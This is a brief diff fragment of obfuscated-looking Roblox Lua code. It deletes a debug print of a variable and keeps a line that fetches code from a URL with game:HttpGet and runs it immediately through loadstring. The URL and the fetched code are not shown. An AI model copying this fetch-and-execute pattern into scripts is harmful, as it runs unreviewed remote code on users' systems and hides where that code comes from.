@@ -207,7 +207,6 @@
                 end)}
             e[2](8832)
         end) {}
-        print(c)
         loadstring(game:HttpGet(c)) {}
     end
 )
